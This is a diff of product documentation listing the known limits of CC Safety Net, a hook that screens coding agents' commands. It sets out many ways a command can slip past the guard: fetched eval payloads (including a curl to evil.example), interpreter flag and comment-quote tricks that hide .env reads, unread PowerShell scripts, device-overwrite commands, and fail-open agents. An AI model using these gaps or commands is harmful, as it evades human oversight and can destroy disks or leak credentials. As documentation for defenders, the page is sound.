@@ -1,288 +1,112 @@
 ---
 title: "Known limitations and pitfalls"
 sidebarTitle: "Known limitations"
-description: "What CC Safety Net cannot catch: opaque command proxies, in-binary behavior, filesystem containment and network, symlink TOCTOU, interpreter flags, quotes inside interpreter comments, the cmd and nested PowerShell readers, eval-based execution, the Codex interactive-session and workdir gaps, the Kimi Code web and ACP working directory, the OpenCode v1 workdir on Windows, the Grok Build, Factory Droid, and Devin CLI fail-open hosts, the DeepSeek Harness profile, optional-bundle, and run_code gaps, and the Hermes Agent and OpenClaw coverage boundaries including the OpenClaw session working directory and `openclaw agent exec`."
+description: "What CC Safety Net cannot catch: which agents fail open and what each one leaves uncovered, opaque command proxies, eval, parser gaps, the PowerShell and cmd readers, sensitive-path coverage, filesystem containment, network, symlink swaps, and rule files an agent can edit."
 ---
 
 ## What can't CC Safety Net protect against?
 
-CC Safety Net checks supported tool calls before they run. It does not contain processes. It has no network layer, so it cannot stop data leaving over the network. It protects the credential files it recognizes plus deny paths you add, so a secret in an unrecognized file stays readable. It cannot see what a binary does internally, and commands that bypass an installed integration are never checked. A denial stops one tool call; it does not enforce filesystem permissions. For exfiltration, untrusted code, or complete containment, use a sandbox or operating-system permissions alongside it.
+CC Safety Net checks supported tool calls before they run. It does not contain processes and has no network layer, so it cannot stop data leaving over the network. It protects the credential files it recognizes plus the deny paths you add. It cannot see what a binary does internally, and a command that bypasses an installed integration is never checked. For exfiltration, untrusted code, or complete containment, run it alongside a [sandbox](/guides/vs-sandboxing) or operating-system permissions.
 
-CC Safety Net analyzes the command string your agent attempts to run. It is a pre-execution hook that protects well against accidental data loss from known-destructive git and filesystem operations, but it is not a complete security solution. This page is an honest list of the **residual** limits that remain today, so you can set correct expectations and know when to use [sandboxing](/guides/vs-sandboxing) instead.
+Standard mode is best-effort for adversarial or dynamic input. Several limits below are relaxations that [strict or paranoid mode](/configuration/modes) closes, and this page says where.
 
-The project's scope is deliberately focused: it is a best-effort, static pre-execution hook for supported coding-agent tool calls. It is not an operating-system sandbox, a privilege boundary, or protection for commands that bypass an installed integration.
+## Agent-specific limits
 
-<Note>
-  Standard mode is best-effort for adversarial or dynamic input, and several items below are relaxations that [strict or paranoid mode](/configuration/modes) closes. Where that is the case, this page says so.
-</Note>
+Every integration blocks a call when CC Safety Net itself cannot finish analyzing it. What happens when the hook process crashes, times out, or cannot start, or when the plugin fails to load, is up to the agent. The table shows each agent's behaviour as of October 2026, from its documentation or source code. "Allows the call" means a broken hook protects nothing.
+
+| Agent | If the hook crashes or times out | What is not covered |
+| --- | --- | --- |
+| [Amp Code](/installation/amp-code#amp-code-coverage-limits) | Blocks on a CC Safety Net error. Undocumented for a crashed or unloaded plugin | Input another plugin rewrites after CC Safety Net allowed it |
+| [Antigravity CLI](/installation/antigravity-cli#what-the-antigravity-cli-hook-checks) | Blocks the call | Only `run_command` and `manage_task` `send_input` are analyzed as commands |
+| [Claude Code](/installation/claude-code#when-claude-code-asks-you-instead-of-blocking) | Allows the call (fail-open) | At `standard`, two unverifiable denials become an approval prompt instead |
+| [Codex](/installation/codex#codex-coverage-limits) | Allows the call (fail-open) | Text typed into a running session, and the call's `workdir` |
+| [Cursor](/installation/cursor#what-the-cursor-hook-checks) | Blocks the call (`failClosed: true`) | Only `Shell` calls are analyzed as commands |
+| [DeepSeek Harness](/installation/deepseek-harness#deepseek-harness-coverage-limits) | Blocks on a guard error. A bundle that fails to load leaves the profile unchecked | Profiles other than `web` and `desktop`, `run_code` in PTC mode, `terminal_send` |
+| [Devin CLI](/installation/devin-cli#devin-cli-coverage-limits) | Allows the call (fail-open) | Project `.devin/hooks.v1.json` hooks, commands split across `write_to_process` calls, Devin Cloud |
+| [Factory Droid](/installation/factory-droid#factory-droid-coverage-limits) | Allows the call (fail-open) | Everything while `allowManagedHooksOnly` is on. `Task`, `Loop`, and automation tools are unverified |
+| [Gemini CLI](/installation/gemini-cli) | Allows the call on a crash, timeout, or invalid output. Blocks if `npx` or `node` is missing | No agent-specific gap is documented |
+| [GitHub Copilot CLI](/installation/github-copilot-cli) | Blocks on a crash or when the hook cannot start. Allows the call on a timeout or invalid output | No agent-specific gap is documented |
+| [Grok Build](/installation/grok-build#what-the-grok-build-hook-checks) | Allows the call (fail-open) | A hook failure that prints nothing lets the call run |
+| [Hermes Agent](/installation/hermes-agent#hermes-agent-coverage-limits) | Blocks the call | Tools other than `terminal`, `read_file`, `write_file`, and `patch`, `!command` input, Windows |
+| [Kimi Code](/installation/kimi-code#kimi-code-coverage-limits) | Allows the call (fail-open) | The session directory in `kimi web` and ACP sessions |
+| [OpenClaw](/installation/openclaw#openclaw-coverage-limits) | Blocks on an error. A plugin that fails to load leaves `exec` unchecked | File tools and `apply_patch`, a session directory outside the workspace, `openclaw agent exec`, Windows |
+| [OpenCode](/installation/opencode#opencode-coverage-limits) | Blocks on an error. A plugin that fails to load leaves tools unchecked | A POSIX-rooted `workdir` on Windows with OpenCode 1.x |
+| [Pi](/installation/pi#what-the-pi-extension-checks) | Blocks on an error. A load failure during `/reload` leaves Pi unchecked | Custom command tools named `Shell` |
 
 ## Command-analysis limits
 
 ### Behavior inside binaries
 
-If a command does not visibly contain a destructive operation, command-string analysis cannot infer it. `some-tool --task destructive-cleanup` looks benign to CC Safety Net because it cannot inspect what an arbitrary binary does at runtime. Use [sandboxing](/guides/vs-sandboxing) for that threat class.
+Command analysis sees only the command text. `some-tool --task destructive-cleanup` looks harmless, because CC Safety Net cannot inspect what an arbitrary binary does when it runs. Use a [sandbox](/guides/vs-sandboxing) for that threat.
 
 ### Unconfigured or opaque command proxies
 
-A tool that runs a shell command on your behalf (for example `rtk git reset --hard`) is analyzed once you declare it as a transparent wrapper:
-
-```bash
-npx -y cc-safety-net rule wrapper add rtk
-```
-
-Once configured, analysis looks through the wrapper to the visible child command, so both built-in rules and [custom rules](/configuration/custom-rules) apply to `rtk git reset --hard` as they would to `git reset --hard`. Eight commands need no such declaration, because they always run a visible child: `caffeinate`, `exec`, `nice`, `nohup`, `setsid`, `stdbuf`, `time`, and `timeout`. Configure only the other wrappers you trust. Reserved commands (`git`, `busybox`, the built-in analyzed commands, shell wrappers, and interpreters) cannot be registered as wrappers.
-
-The residual limit is narrower than "every proxy":
-
-- A proxy that is neither one of those eight nor listed in `transparent_wrappers` is not unwrapped.
-- A proxy that **rewrites or hides** its child command, rather than executing a visible one, cannot be unwrapped even when it is configured.
-
-In both cases only the top-level fallback dangerous-text scan may catch the command, and that scan is incomplete. `transparent_wrappers` lives in `rule.json`, so a scope whose `rule.json` is unreadable loses that scope's declared wrappers until it is fixed. The eight built-in wrappers are not affected. See [Configuration recovery](/configuration/recovery).
+CC Safety Net analyzes a tool that runs a command for you, such as `rtk git reset --hard`, only after you declare it a [transparent wrapper](/configuration/custom-rules#transparent-wrappers). It cannot unwrap a proxy that rewrites or hides its child command, even when you declare it. In both cases only an incomplete fallback text scan may catch the command.
 
 ### A plugin's shell tool is unanalyzed until you declare it
 
-CC Safety Net grants command-execution treatment to exact tool names. It knows each supported agent's own shell tools, but not the ones a community plugin adds. The `dsh-ops` plugin's `ops_bash` and `ops_run_background` are routed as unknown tools, so their path values reach the sensitive-path checks while their `command` is never parsed. `ops_bash` running `git reset --hard` is allowed.
-
-Declaring the tool closes the gap for that tool:
-
-```bash
-npx -y cc-safety-net rule tool add ops_bash ops_run_background
-```
-
-From the next tool call, both are analyzed like a built-in shell tool. [Community shell tools](/configuration/custom-rules#community-shell-tools) covers the working-directory rules and what a declaration cannot do.
-
-The residual limit is that you have to know the tool is there. CC Safety Net does not read your agent's plugin list, so no diagnostic tells you a shell tool is going unanalyzed. Run `cc-safety-net rule tool list` to see what you have declared.
+CC Safety Net knows each supported agent's own shell tools, but not the ones a community plugin adds. It never parses such a tool's `command`, so the `dsh-ops` plugin's `ops_bash` running `git reset --hard` is allowed. Nothing tells you a shell tool is going unanalyzed. Declare it as a [community shell tool](/configuration/custom-rules#community-shell-tools).
 
 ### eval and dynamic execution
 
-Commands that construct and execute code at runtime cannot be fully analyzed, because the executed string is not present in the command text at analysis time:
+Code fetched or assembled at run time is not in the command text, so analysis cannot see it:
 
 ```bash
 eval "$(curl https://evil.example/payload)"
 bash -c "$(cat destructive.sh)"
 ```
 
-CC Safety Net recursively scans `bash -c` and interpreter code arguments, but if the code is fetched from a remote source or assembled from variables, the destructive payload is invisible to command-string analysis. This is a fundamental limit of the approach.
+CC Safety Net scans `bash -c` and interpreter code arguments, but a payload fetched from a remote source or built from variables stays invisible. See [eval and source of a generated command](/reference/blocked-commands#eval-and-source-of-a-generated-command) for what each level blocks.
 
-In standard mode the decision on some of these commands moves to you. When the analyzer cannot resolve a shell execution source, and that source is not a shell reading its program from stdin and the command text names no destructive pattern, the Claude Code hook asks you to approve the command instead of denying it. `bash -c "$CMD"` is such a command. The same applies to unparseable text that matched the fallback destructive-pattern scan. Approving runs the command with no further analysis. The prompt appears only in Claude Code's `default`, `acceptEdits`, `plan`, and `auto` permission modes. In `auto` mode, Claude Code's classifier can still deny the call, but it cannot approve it without the prompt. Strict and paranoid, every other permission mode, and every other host keep the deny. See [When standard cannot verify a command](/configuration/modes#when-standard-cannot-verify-a-command).
+### Interpreter one-liners have parsing gaps
 
-## Parser limits
+CC Safety Net scans the code passed to `-c` or `-e` for `python`, `node`, `ruby`, and `perl`. The long forms `--eval`, `--execute`, `--print`, and `--require`, and the `--eval='code'` form, may not be scanned. To block every interpreter one-liner whatever its flags, turn on [paranoid interpreters](/configuration/modes#interpreter-one-liners-cc_safety_net_paranoid_interpreters=1).
 
-### Interpreter long-form flags
+In standard mode, a quote inside an interpreter comment can shift where string literals start, and a Python `"""` in a comment can hide a secret-file read. [Strict mode](/configuration/modes#strict-mode-cc_safety_net_strict=1) is not affected.
 
-CC Safety Net extracts the code passed to an interpreter's `-c` or `-e` flag (for `python`, `python2`, `python3`, `node`, `ruby`, `perl`) and scans it for embedded destructive operations. The **long-form equivalents** (`--eval`, `--execute`, `--print`, `--require`) and the attached `=value` form (`--eval='code'`) are not recognized in every code path. When the long form is used, the code argument may not be extracted for recursive analysis.
+### PowerShell is read as a subset
 
-If interpreter bypass is a concern in your environment, enable [paranoid interpreters mode](/configuration/modes#interpreter-one-liners-cc_safety_net_paranoid_interpreters=1) (`CC_SAFETY_NET_PARANOID_INTERPRETERS=1`), which blocks all interpreter one-liners outright regardless of content.
-
-### Quotes inside interpreter comments
-
-Secret protection blanks the string literals in an interpreter's inline code before scanning the rest as code. That pass is lexical and does not skip comments, so a quote character in a comment pairs with the next quote in the code and shifts where literals begin and end. A Ruby or Perl contraction (`# it's the config`) leaves an apostrophe for the next apostrophe to close, and a Python comment containing `"""` opens a triple-quoted string.
-
-A single- or double-quoted literal that reaches the end of a line without closing aborts the pass, and the whole code falls back to the scan that keeps every quoted and path-like token. That catches most mis-pairings. A Python triple-quote opened in a comment has no such stop, so it can hide a read from standard mode. [Strict mode](/configuration/modes#strict-mode-cc_safety_net_strict=1) is unaffected, because it scans inside literal text as well.
-
-### Attached short-option values
-
-Bundled short flags (for example `-rf`) are correctly split into `{ -r, -f }`. However, the **attached value form** for short options (for example `-Cfoo` where `foo` is the value of `-C`) is handled inconsistently across analyzers. Blocking a flag like `-f` may produce a false positive when it is actually part of an attached option value like `-Cfoo`.
-
-This is most relevant when writing precise [custom rules](/configuration/custom-rules). When in doubt, use [strict](/configuration/modes#strict-mode-cc_safety_net_strict=1) or [paranoid](/configuration/modes#paranoid-mode-cc_safety_net_paranoid=1) mode for stronger protection.
-
-### Symlink TOCTOU risk
-
-`rm -rf` target classification resolves symlinks to their canonical targets before deciding whether a path is dangerous. There is an unavoidable **time-of-check-to-time-of-use (TOCTOU)** window between when the analyzer resolves a path and when the shell actually executes the `rm`. A symlink could be repointed in that window.
-
-This is inherent to any pre-execution command analysis tool; fully closing it would require running inside the kernel or intercepting syscalls, which is out of scope for a hook. The [paranoid rm](/configuration/modes#rm-check-cc_safety_net_paranoid_rm=1) mode (`CC_SAFETY_NET_PARANOID_RM=1`) provides a stricter stance for operators who want to block more aggressively.
+CC Safety Net reads a conservative subset of PowerShell, not the full language. In the `posix` shell mode, the `Remove-Item` rules apply only inside a nested `powershell` or `pwsh` `-Command` script. In `auto` mode, `ForEach-Object` and `Where-Object` switch to the PowerShell reader, but their `%` and `?` aliases do not. See [PowerShell commands](/reference/blocked-commands#powershell-commands).
 
 ### Windows Command Prompt and nested PowerShell
 
-CC Safety Net reads a `cmd /c` or `cmd /k` body with a bounded text check, not a cmd parser. The check finds a delete word anywhere in a piece of the body, so it can block a command that deletes nothing. `cmd /c 'echo rmdir /s /q C:\'` blocks as a drive-root delete. The check does not open a batch file the body runs, and it does not evaluate delayed expansion (`!VAR!`), so a delete inside the file or assembled at run time is not seen.
+CC Safety Net reads a `cmd /c` or `cmd /k` body with a text check, not a cmd parser. It can block a command that deletes nothing, such as `cmd /c 'echo rmdir /s /q C:\'`. It does not open a batch file the body runs or evaluate delayed expansion (`!VAR!`).
 
-A nested `powershell` or `pwsh` is read only in the shape described under [Nested PowerShell scripts](/reference/blocked-commands#nested-powershell-scripts). A script run with `-File` or read from stdin is not read, so `pwsh -File cleanup.ps1` is allowed whatever the file does. An unread form is blocked only when its own text names a delete command and a recursive switch.
+CC Safety Net reads a nested `powershell` or `pwsh` only in the shape described under [Nested PowerShell scripts](/reference/blocked-commands#nested-powershell-scripts). It does not read a script run with `-File` or read from stdin, so `pwsh -File cleanup.ps1` is allowed whatever the file does.
 
 ## Out-of-scope protections
 
-These are boundaries CC Safety Net does not attempt to cover. Most of them need **containment** rather than semantic analysis, which is a different layer. See [where CC Safety Net cannot help](/guides/vs-sandboxing#where-cc-safety-net-cannot-help) for the sandboxing counterpart of each one.
+These limits need containment rather than command analysis. A [sandbox](/guides/vs-sandboxing) covers most of them.
 
-### Sensitive-path coverage is bounded, not a general read boundary
+### Sensitive-path coverage is bounded
 
-CC Safety Net **does** protect sensitive paths. The [built-in sensitive set](/reference/secret-protection) includes `.env` variants, `~/.ssh/id_*`, `~/.aws`, `~/.kube/config`, coding-CLI credential stores, and more. Reads of these paths are blocked, as are user-configured deny paths and all of their descendants. Protection applies across supported command, path, search, and patch shapes, including unknown-tool fallback inspection.
+[Secret protection](/reference/secret-protection) blocks reads of a fixed set of credential files plus your deny paths. It is not a general read boundary:
 
-Coding-CLI coverage comes in two tiers. The **credential** tier (auth tokens and credential stores) is on by default. The **config** tier (settings and MCP config files, which agents edit as routine work) ships off and needs an explicit `"on"` override in `secret_protection.overrides`. One consequence worth knowing: Antigravity's only rule (`secret.cli.antigravity`) lives in the opt-in config tier, so Antigravity has no on-by-default credential rule. The full tier list, with the paths each rule protects, is in the [Secret protection reference](/reference/secret-protection#coding-cli-credential-tier-on-by-default).
-
-The residual limit is that this is a **bounded pattern set over supported shapes**, not a general read boundary:
-
-- A credential in a file whose name and extension are not on the pattern list is not recognized.
-- Standard mode allows metadata-only checks of built-in sensitive paths (for example `test -f ~/.ssh/id_rsa`, `find ~/.ssh -type f`, `ls -la ~/.ssh`, `stat .env`, `wc -l .env`, or `grep -l KEY .env`), either alone or as one segment of a compound command such as `test -f .env && echo present`. For the built-in file-name rules it also treats some shapes as a mention rather than a read, such as a secret name that is an existing directory, a file that a redirection, `mkdir`, or `touch` creates, and a Python or JavaScript string literal in a data position. Those shapes never apply to the `secret.home.*` or `secret.cli.*` rules. [Strict and paranoid](/configuration/modes#strict-mode-cc_safety_net_strict=1) block every form listed here, and configured deny paths are never relaxed in any mode. [What standard mode does not count as a read](/reference/secret-protection#what-standard-mode-does-not-count-as-a-read) has the exact conditions.
-- Standard mode does not follow a name to a later read. A string literal held in a collection is data even when the code opens it afterwards, so `python3 -c "for f in {'.env'}: print(open(f).read())"` is allowed. Nor does it follow a `for` loop variable that the loop writes to a file for a later command to read back. Strict mode blocks both.
-- Setting `secret_protection.enabled` to `false` in `policy.json` turns the whole stage off, deny paths included.
-
-For a boundary that constrains *all* reads rather than a recognized set, use [sandboxing](/guides/vs-sandboxing#where-cc-safety-net-cannot-help).
+- CC Safety Net does not recognize a credential in a file whose name and extension are not on the list.
+- Standard mode allows metadata-only checks such as `test -f .env` and some shapes it counts as a mention, not a read. See [What standard mode does not count as a read](/reference/secret-protection#what-standard-mode-does-not-count-as-a-read). Strict and paranoid block those shapes.
+- Standard mode does not follow a name to a later read, so `python3 -c "for f in {'.env'}: print(open(f).read())"` is allowed. Strict blocks it.
+- `secret_protection.enabled: false` in `policy.json` turns the whole stage off, deny paths included.
 
 ### No complete filesystem containment
 
-CC Safety Net denies a tool call before it runs; it does not enforce filesystem permissions. The block message is guidance to the agent, not a claim of complete filesystem enforcement. Catastrophic protections (recursive deletion of root or home, the protected Git metadata set, and `policy.json` in both scopes) are always enforced, but when you need complete protection rather than best-effort interception, use a trusted write broker, operating-system permissions, a sandbox, or equivalent runtime enforcement.
+A denial stops one tool call. It does not enforce filesystem permissions. The catastrophic rules always apply, but for complete protection use operating-system permissions, a sandbox, or a write broker.
 
 ### Disk-tool coverage is a named list
 
-The disk-destruction rules match named heads and verbs, not every way to overwrite a device. `fdisk`, `sfdisk`, `gdisk`, `mkswap`, and `blkdiscard` are not analyzed, and neither are the `diskutil apfs` subcommands, so `fdisk /dev/sda` and `diskutil apfs deleteContainer disk4` are allowed. Writing to a device through a command other than `dd` is also uncovered, so `tee /dev/sda` and `cp img.raw /dev/sda` both run. The redirect rule reads literal targets only, so `echo x > $DEV` is allowed however `DEV` is set. Add a [custom rule](/configuration/custom-rules) for the tools your team uses.
+The disk rules match named commands. CC Safety Net does not analyze `fdisk`, `sfdisk`, `gdisk`, `mkswap`, `blkdiscard`, or the `diskutil apfs` subcommands, so `fdisk /dev/sda` is allowed. Writing to a device through anything but `dd` is also uncovered, so `tee /dev/sda` and `cp img.raw /dev/sda` run. The redirect rule reads literal targets only, so `echo x > $DEV` is allowed. Add a [custom rule](/configuration/custom-rules) for the tools your team uses.
 
 ### No network layer
 
-Runtime evaluation performs no network requests, and nothing in the guard pipeline inspects or filters egress. Data exfiltration over the network, domain allowlisting, and container boundaries are outside the product. Those are exactly what sandboxing's network restrictions address.
+CC Safety Net makes no network requests while it checks a call and does not filter traffic. Data exfiltration, domain allowlists, prompt-injection-driven exfiltration, and container boundaries are outside it. A sandbox's network restrictions cover them.
 
-### General attack prevention
+### Symlink TOCTOU risk
 
-Blocking prompt-injection-driven exfiltration, authenticating users, and enforcing container boundaries are all out of scope. CC Safety Net assumes the agent's command string is untrusted, but it does not detect hidden behavior inside arbitrary binaries.
+CC Safety Net resolves symlinks when it classifies an `rm -rf` target, and the shell runs the `rm` afterwards. CC Safety Net does not catch a symlink repointed in between. No pre-execution hook can close this gap. [Paranoid rm](/configuration/modes#rm-check-cc_safety_net_paranoid_rm=1) blocks more recursive deletes if you want a stricter stance.
 
 ### Custom rule configuration is not tamper-resistant
 
-Tamper resistance covers `policy.json` in both scopes: the user file, and the project file resolved from the execution directory and from the configuration directory. `rule.json` and rulebooks are not protected. Every rulebook is a live file the runtime rereads on each tool call, so an agent that can write in the rules directory changes what is enforced on the next one.
-
-Removing a source entry from `rule.json` is no longer the only ungated change. Nothing records what `rule update` wrote into a vendored `rulebook.json`, so an edit to a rule's `match` or `reason` inside that file leaves no evidence of the edit. At load the runtime checks the file against the schema and checks that its `name` matches the source, then enforces whatever it finds. The edit stands until the next `rule update` overwrites the file. Protecting `rule.json` is a deferred product decision.
-
-The project `policy.json` has one deliberate bound. Its protected directory chain stops at its own `.cc-safety-net` directory, while the user file's chain covers its directory and every ancestor up to the filesystem root. Walking the project chain further would claim the project directory and every ancestor above it. Those are exactly the paths the destructive-command rules target, and policy protection runs first, so `rm -rf .` and `find . -delete` would report this guard's generic reason in place of their own.
-
-## Hermes Agent and OpenClaw coverage boundaries
-
-The Hermes Agent and OpenClaw integrations cover a defined set of tools and execution hosts. Everything outside that set either gets no decision or is blocked outright. The boundaries are listed here.
-
-### Hermes Agent sees a fixed tool list
-
-The managed Hermes plugin registers a single `pre_tool_call` hook and forwards exactly four tools to analysis: `patch`, `read_file`, `terminal`, and `write_file`. A call to any other Hermes tool is not forwarded and gets no decision.
-
-A `!command` you type yourself also stays outside: bang-shell input does not raise `pre_tool_call`, so it goes to Hermes' own command guard instead. CC Safety Net sees model-generated tool calls only, not every subprocess Hermes starts. If Hermes never loads the plugin, nothing blocks. Only `npx cc-safety-net doctor` reports a plugin that is present but not enabled.
-
-### OpenClaw covers exec on the local Gateway host
-
-The OpenClaw plugin registers `before_tool_call` for the canonical `exec` tool only. `apply_patch` and OpenClaw's read/write/edit file tools are not protected. An `exec` event with a `toolKind` discriminator also gets no decision. This excludes tools that share the `exec` name, such as Code Mode's JavaScript `exec`, whose `command` field is not a proven shell-command mapping.
-
-Execution hosts split three ways:
-
-- An `exec` call with no `host`, `host: "auto"`, or `host: "gateway"` is analyzed as a local Gateway call, with paths resolved against the agent workspace.
-- An explicit `host: "sandbox"` or `host: "node"` is blocked as unsupported rather than analyzed, because no test proves a correct path mapping for those hosts.
-- The configured `tools.exec.host` default never changes the analysis: the plugin reads only the call's own `host` parameter, so a call with no `host` is analyzed as a local Gateway call even when the default routes it to `node` or `sandbox`.
-
-One residual gap is the `auto` case: when a sandbox runtime is active, an `auto` call runs in the sandbox filesystem while path rules are still evaluated against the Gateway workspace. Command rules are unaffected; path rules can be evaluated against the wrong filesystem.
-
-The other residual gap is the execution directory. OpenClaw runs `exec` in the session's working directory, which is not always the agent workspace. A managed-worktree session runs in its own checkout, by default under `<state>/worktrees`, and a session created with a `cwd` runs there. The `before_tool_call` hook context carries no working directory, so the plugin resolves every `exec` call against the agent workspace. In a session whose directory differs from the workspace:
-
-- CC Safety Net analyzes a command with no `workdir` against the workspace, but OpenClaw runs it in the session directory.
-- A relative `workdir` resolves against the workspace instead of the session directory.
-- CC Safety Net blocks an absolute `workdir` outside the workspace, such as the session's own worktree.
-
-Closing this gap requires the host to expose the execution directory.
-
-One OpenClaw command skips the hook entirely. `openclaw agent exec` never loads the plugin hook registry, so no `before_tool_call` hook runs, and its tool calls are neither analyzed nor audited, even with the plugin installed and loaded. The same tool call through `openclaw agent --local` is blocked.
-
-The Codex-native relay is untested and therefore unclaimed: the live end-to-end tests drive OpenClaw's own agent runtime, so they prove nothing about a Codex-native shell, patch, or MCP call.
-
-### Windows is not supported for either integration
-
-Both integrations assume the POSIX state layout. Hermes takes its root from `HERMES_HOME` or `~/.hermes`, and the root's `active_profile` file selects `<root>/profiles/<name>` unless that file is missing, empty, or names `default`. A `HERMES_HOME` that already points inside a `profiles` directory is used unchanged. OpenClaw takes its home from `OPENCLAW_HOME` or the OS home, and its state directory from `OPENCLAW_STATE_DIR`, the directory of `OPENCLAW_CONFIG_PATH`, or `<home>/.openclaw`, in that order. See the [Hermes Agent](/installation#hermes-agent-installation) and [OpenClaw](/installation#openclaw-installation) installation sections. The Windows defaults are not supported. Install and detection target the POSIX path on Windows, so the Hermes install writes the plugin to a directory Hermes does not read. OpenClaw's own CLI installs correctly, but `doctor` misreports the state.
-
-## DeepSeek Harness coverage boundaries
-
-CC Safety Net is an optional profile plugin bundle in DeepSeek Harness, and its guard is deny-only. Several parts of the host sit outside it.
-
-### Install covers the web and desktop profiles only
-
-`install --deepseek-harness` adds the plugin to the `web` and `desktop` profiles only. The `acp`, `headless`, `sdk`, and `sdk-minimal` profiles, and any profile created later, run without CC Safety Net until you add the plugin with `dsh plugin --profile <name> add cc-safety-net`.
-
-### An optional bundle that fails to load only warns
-
-DeepSeek Harness treats a failed import or `apply()` of an optional plugin as a warning and keeps running, so a profile whose bundle does not load runs unprotected. `doctor` reads the profile manifests on disk, not the running host, so it reports that profile as configured. Desktop adds a second case. Its crash-recovery action disables third-party bundles, and they stay off until you re-enable them from the Plugins page.
-
-### run_code in PTC mode is not analyzed
-
-In PTC mode, which is off by default, the `run_code` tool runs model-written TypeScript that can call Node.js APIs directly. Only the tool sub-calls that code makes reach the guard, so a filesystem write it performs through `node:fs` gets no decision.
-
-### terminal_send text reaches the shell unanalyzed
-
-The opt-in terminal tools write `terminal_send` text into a persistent shell without analysis. A persistent `bash` or `pwsh` tool is analyzed on every call. That tool keeps its directory changes across calls, while CC Safety Net evaluates each call against the session workspace. The two can therefore point at different directories.
-
-### Windows Desktop paths are untested
-
-On Windows, CC Safety Net looks for the Desktop app at `%LOCALAPPDATA%\Programs\DeepSeek Harness\resources\runtime\cli\bin\dsh.cmd`, and reads `%APPDATA%\@deepseek-ai\dsh-desktop\lockfile` to decide whether it is running. No test covers either path against a real Windows Desktop install. The web profile is unaffected, and on Linux there is no Desktop lookup at all. See [DeepSeek Harness installation](/installation#deepseek-harness-installation).
-
-## Codex coverage boundary
-
-Codex's unified exec path, the default shell path on every platform, sends a `PreToolUse` payload when a command opens a session, but none for `write_stdin`. Only the command that opened the session is evaluated. Text the model then types into the already-running interactive session reaches the shell without inspection and without an audit entry.
-
-This gap cannot be closed from the hook side: the host emits no event for that call, so there is nothing to analyze.
-
-The payload also leaves out the call's `workdir`. It carries only `{command}`, and its `cwd` is the turn's working directory. Codex runs the command in `workdir`, so CC Safety Net analyzes it against the turn directory instead. Relative paths resolve against that directory, and so do the rules about paths outside the working directory. That can block a safe command, and it can allow one the rules would otherwise block. Closing this gap requires the host to include `workdir` in the payload.
-
-If either gap matters in your environment, use [sandboxing](/guides/vs-sandboxing) as the containment layer.
-
-## Kimi Code coverage boundary
-
-In `kimi web` and ACP sessions, Kimi Code sends the server process directory as the payload `cwd`, not the session's own directory, and the payload carries no other working directory. CC Safety Net therefore analyzes every `Bash` call in those sessions against the directory the server was launched from:
-
-- Relative paths, and the rules about paths outside the working directory, are judged against the wrong directory. That can block a safe command, and it can allow one the rules would otherwise block.
-- A `cwd` argument that names the session directory is denied when that directory is outside the server's launch directory.
-
-Terminal `kimi` sessions are unaffected. Closing this gap requires the host to send the session directory.
-
-## OpenCode coverage boundary
-
-On Windows, OpenCode v1 converts a POSIX-rooted `workdir` such as `/tmp` with `cygpath -w` when it runs a POSIX shell. CC Safety Net resolves the same `workdir` against the current drive, as `C:\tmp`. Such a call can be analyzed against a different directory than the one it runs in.
-
-## Grok Build is a fail-open host
-
-Grok Build hooks are fail-open by design, and the host exposes no `failClosed` knob. Only an explicit deny on stdout blocks a tool call. A hook that crashes, times out, or emits malformed output lets the call proceed.
-
-The adapter still emits an explicit deny for its own fail-closed outcomes, such as truncated tool input or an unusable working directory. On this host it cannot block a call when the failure leaves the adapter with no output at all. If that residual risk matters in your environment, use [sandboxing](/guides/vs-sandboxing) as the containment layer.
-
-## Factory Droid is a fail-open host
-
-Factory Droid hooks fail open. Only exit code 2 or an explicit deny decision on stdout blocks a tool call. A CC Safety Net deny uses both. The adapter prints the deny decision, writes the reason to stderr, and exits with code 2. Droid 0.240.0 takes the first hook result that carries any permission decision, so another installed hook that allows or asks could drop a deny given only on stdout. Exit code 2 always blocks. An exit code other than 0 or 2, a crash, a timeout, or a missing `npx` is logged as a non-blocking error, and the call proceeds. The adapter prints nothing for an allowed call, so Droid's own permission prompt still applies.
-
-One Droid setting switches the hook off entirely. `allowManagedHooksOnly` is an enterprise setting that makes Droid ignore user and project hooks. `install --droid` writes the hook to `~/.factory/hooks.json`, which is a user hook, so it does not run while the setting is on.
-
-Tool coverage is bounded as well. The hook was verified against `Execute` and the file tools. `Task` subagents, `Loop`, and automation tools have not been verified to reach it.
-
-## Devin CLI is a fail-open host
-
-Devin CLI hooks fail open, but only on a narrow set of failures. Only exit code 2 or a `block` decision on stdout blocks a tool call, and only three failures let the call proceed: a timeout, a missing `npx`, and a hook process that dies before printing a decision. An error the adapter catches itself still blocks, because the adapter prints a `block` decision for it. The adapter prints nothing for an allowed call, so Devin's own permission prompt still applies.
-
-Several parts of the host sit outside the integration:
-
-- Only the user-level config that `install --devin` writes is supported: `$XDG_CONFIG_HOME/devin/config.json`, by default `~/.config/devin/config.json`, or `%APPDATA%\devin\config.json` on Windows. Hooks declared there run in the session directory, and the adapter analyzes every call against that directory, except an `exec` call whose `workdir` names another one. Hooks in a project `.devin/hooks.v1.json` run with the repository root as their working directory instead, and the payload carries no `cwd` to correct for that.
-- Each `write_to_process` call is analyzed on its own, so a command whose text arrives split across several writes to an interactive shell is outside the analysis.
-- In `write_to_process`, only `<CR>` and `<LF>` end a line in `bytes_input`. CC Safety Net denies a call that carries text in `text_input` or `bytes_input` together with any other key (`<ESC>`, `<BS>`, an arrow key, or a `<C-…>` key), because the line the receiving program runs cannot be known. Those keys alone, such as `<UP><CR>` or `<C-c>`, are not analyzed as a command. An undocumented key token, or text in both `text_input` and `bytes_input` of one call, is also denied.
-- Devin Cloud sessions are not covered.
-- Devin loads Claude Code hook files by default, so a CC Safety Net hook installed for Claude Code can run in a Devin session as well. That only duplicates denials.
-
-## Resolve stale integration caches
-
-### OpenCode stale cache
-
-OpenCode's plugin installer can keep serving a stale cached version of `cc-safety-net` after a new release is published. If updates do not take effect, clear the cache and reinstall. See the [OpenCode installation steps](/installation#opencode-installation). Run `npx cc-safety-net doctor` to confirm the detected plugin version.
-
-### Stale npx cache (Antigravity CLI, Cursor, Devin CLI, Factory Droid, Grok Build, Hermes Agent, Kimi Code)
-
-The Antigravity CLI, Cursor, Devin CLI, Factory Droid, Grok Build, and Kimi Code hooks and the Hermes Agent plugin run through `npx -y cc-safety-net`, so npx's own cache can also keep serving an old release. Installing any of those seven targets first removes every npx cache entry that contains `cc-safety-net` (the `_npx/*/node_modules/cc-safety-net` entries). A plain reinstall then picks up the new release without manual cache clearing. Installs for other targets do not touch this cache.
-
-### Stale bunx cache
-
